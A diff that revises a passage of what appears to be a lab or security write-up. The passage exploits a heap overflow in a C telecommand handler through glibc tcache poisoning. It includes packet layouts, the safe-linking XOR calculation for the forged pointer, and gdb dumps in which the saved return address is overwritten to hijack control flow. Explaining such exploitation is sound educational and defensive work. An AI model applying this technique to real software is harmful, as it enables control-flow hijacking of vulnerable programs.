@@ -1338,7 +1338,7 @@ afl-fuzz -i seeds -o findings/remediated -x dict ./sentinel_network_remediated @
 
 The `sentinel_network.c` handler contains two heap buffer overflow vulnerabilities. Vulnerability 12 writes almost 4 GB of data into a 1024-byte buffer, which almost certainly corrupts unmapped (or read-only) memory and crashes the program, so it does not lead to further exploitation. Vulnerability 13, by contrast, writes only 8 bytes beyond the buffer requested for a type-2 packet; this does not trigger an immediate crash and can overwrite the forward pointer (fd) of an adjacent chunk. We therefore focus on Vulnerability 13.
 
-glibc keeps freed chunks in more than one kind of bin. One is the unsorted bin, a doubly-linked list; its fd/bk pointers are subject to glibc integrity checks, so it is harder to exploit. The tcache is a LIFO, singly-linked, size-segregated free list used for small chunks. When a chunk is freed into the tcache, its first 4 bytes become the forward pointer and the next 4 bytes become the key used for double-free detection. A newly freed chunk is inserted at the head of its list, and its fd points to the chunk that was previously at the head. When a subsequent malloc requests a size present in a tcache list, a chunk is popped from the head of that list. If we can tamper with the fd of an entry, then once that entry is popped the list's new head becomes the forged address, so the next allocation of that size returns a pointer into an attacker-chosen memory region. Because Vulnerability 13 lets us reach an adjacent chunk's fd, we target the tcache.
+glibc keeps freed chunks in more than one kind of bin. One is the unsorted bin, a doubly-linked list. Its fd/bk pointers are subject to glibc integrity checks, so it is harder to exploit. The tcache is a LIFO, singly-linked, size-segregated free list used for small chunks. When a chunk is freed into the tcache, its first 4 bytes become the forward pointer and the next 4 bytes become the key used for double-free detection. A newly freed chunk is inserted at the head of its list, and its fd points to the chunk that was previously at the head. When a subsequent malloc requests a size present in a tcache list, a chunk is popped from the head of that list. If we can tamper with the fd of an entry, then once that entry is popped the list's new head becomes the forged address, so the next allocation of that size returns a pointer into an attacker-chosen memory region. Because Vulnerability 13 lets us reach an adjacent chunk's fd, we target the tcache.
 
 Using Vulnerability 13, the tcache can be corrupted as follows. 
 
@@ -1351,7 +1351,7 @@ The input file contains seven packets in total:
 - packet6: type=2, length=0x2c
 - packet7: type=2, length=0x10
 
-packet1–packet3 push their packet data (msg + buffer) onto the heap in order. Their lengths are chosen to end in 0xc because allocations are 16-byte aligned: even though the exact requested size is not reserved, glibc still rounds the allocation up to a full 16-byte chunk, so the 8-byte excess is absorbed by that extra space and does not cause an overflow.
+packet1–packet3 push their packet data (msg + buffer) onto the heap in order. Their lengths are chosen to end in 0xc. Due to the payload-size-calculation flaw the buffer is malloc'd for `length − 8` (ending in 0x4), but `memcpy` copies the full length. Because glibc adds the 4-byte size field of the next adjacent chunk and aligns to 16, the usable region ends up exactly 8 bytes larger than the requested size, and that extra space absorbs the 8-byte over-copy. So for packet1–packet3 the overflow stays within each chunk and does not corrupt adjacent chunks.
 ```bash
 (gdb) continue
 Continuing.
@@ -1377,9 +1377,9 @@ Thruster calibration telecommand processed successfully.
 0x5655b5c0:     0x5655b5d0      0x00000024      0x00000001      0x00000031   # packet2 msg(0xc)
 0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet2 buffer(0x2c)
 0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
-0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011   # packet3 msg(0xc) 
-0x5655b600:     0x5655b610      0x00000004      0x00000001      0x00000011   # packet3 buffer(0xc)
-0x5655b610:     0x43434343      0x43434343      0x43434343      0x000209e9
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011   
+0x5655b600:     0x5655b610      0x00000004      0x00000001      0x00000011   # packet3 msg(0xc)  
+0x5655b610:     0x43434343      0x43434343      0x43434343      0x000209e9   # packet3 buffer(0xc)
 0x5655b620:     0x00000000      0x00000000      0x00000000      0x00000000
 ```
 
@@ -1413,7 +1413,9 @@ Next, packet5 (type=2, length=0x44) is added:
 - its msg record is taken from tcache(0x10)
 - its buffer is taken from tcache(0x40)
 
-The reused buffer chunk has 60 usable bytes, but length=0x44 copies 68 bytes, so the write runs 8 bytes past the chunk and overwrites the size field (left as 0x11) and the forward pointer (fd) of the adjacent freed packet2 msg chunk. We set that fd to an address near the saved return address of `dispatch_telecommand`'s stack frame.
+The reused buffer chunk has 60 usable bytes, but length=0x44 copies 68 bytes, so the write runs 8 bytes past the chunk and overwrites the size field (left as 0x11) and the forward pointer of the adjacent freed packet2 msg chunk. We set that fd to an address near the saved return address of `dispatch_telecommand`'s stack frame. 
+
+The target address is `0xffffced0`. Under safe-linking, glibc does not store the fd directly but as `ptr ^ (pos >> 12)`, where `ptr` is the target and `pos` is the address of the fd slot. Here the slot sits at `0x5655b5c0`, so `pos >> 12` is `0x5655b`, and the value we write is `0xffffced0 ^ 0x5655b = 0xfffaab8b`. When the chunk is popped, malloc applies the same XOR again, which cancels out and returns `0xffffced0`.
 ```bash
 (gdb) continue
 Continuing.
@@ -1426,7 +1428,7 @@ Thruster calibration telecommand processed successfully.
 0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011   # <== overflow: packet2 msg size
-0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xfffaab8b ^ 0x5655b = 0xffffced0)
+0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xffffced0 ^ 0x5655b = 0xfffaab8b)
 0x5655b5d0:     0x0005655b      0xc1d09a22      0x42424242      0x42424242
 0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
 0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
@@ -1450,7 +1452,7 @@ Thruster calibration telecommand processed successfully.
 0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011   # <== overflow: packet2 msg size
-0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xfffaab8b ^ 0x5655b = 0xffffced0)
+0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xffffced0 ^ 0x5655b = 0xfffaab8b)
 0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet6 buffer (reused packet2 buffer)
 0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
 0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
@@ -1463,7 +1465,7 @@ Finally, packet7 (type=2, length=0x10) is added:
 - its msg record is taken from tcache(0x10)
 - its buffer is taken from tcache(0x10)
 
-After packet2 msg is popped from tcache(0x10) to satisfy the msg allocation, the list's new head becomes the forged address. Because the buffer is the same size class (0x10), the next allocation pops that forged address, and the packet data is written there. length=0x10 copies 16 bytes — 12 bytes of padding plus the 4-byte address of `exit` — so the write reaches the saved return address at RET_SLOT+12.
+After packet2 msg is popped from tcache(0x10) for the msg allocation, the list's new head becomes the forged address `0xffffced0`. The buffer is the same size class (0x10), so the next allocation pops `0xffffced0`, and the packet data is written starting at that address. The packet writes 12 bytes of padding followed by the 4-byte address of `exit`, so the `exit` address lands exactly on the saved return address in `dispatch_telecommand`'s stack frame. When the function returns, control jumps to `exit` and the program terminates.
 ```bash
 (gdb) ni
 [NETWORK LOG] Command Type: 2, Length: 16, Magic: 0x12345678, Data: CCCCCCCCCCCC�
@@ -1475,18 +1477,17 @@ Thruster calibration telecommand processed successfully.
 0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
 0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011
-0x5655b5c0:     0xffffced0      0x00000008      0x00000001      0x00000031   # packet7 msg (reused packet2 msg): buffer=0xffffced0 = RET_SLOT (forged addr)
+0x5655b5c0:     0xffffced0      0x00000008      0x00000001      0x00000031   # packet7 msg (reused packet2 msg): buffer=0xffffced0 (forged addr)
 0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet6 buffer (reused packet2 buffer)
 0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
 0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
 0x5655b600:     0x5655b580      0x0000003c      0x00000001      0x00000011   # packet5 msg (reused packet3 msg)
 0x5655b610:     0x5655b5d0      0x00000024      0x00000001      0x000001d1   # packet6 msg (reused packet3 buffer)
 0x5655b620:     0x00100010      0x00100010      0x00100010      0x00100010
-# packet7 buffer = 0xffffced0 (RET_SLOT), popped from the poisoned 0x10 bin.
-# 16 bytes written there = 12 pad + exit address -> overwrites the saved return address at RET_SLOT+12 (on the stack, not shown here).
-```
 
-As a result, when `dispatch_telecommand` returns, instead of transferring control back to its caller it calls `exit` (control-flow hijack), forcibly terminating the program.
+(gdb) x/4xw 0xffffced0
+0xffffced0:     0x43434343      0x43434343      0x43434343      0xf7db22b0   # saved return address of dispatch_telecommand overwritten with address of exit
+```
 
 ### 6.3 Complete Exploit Script
 
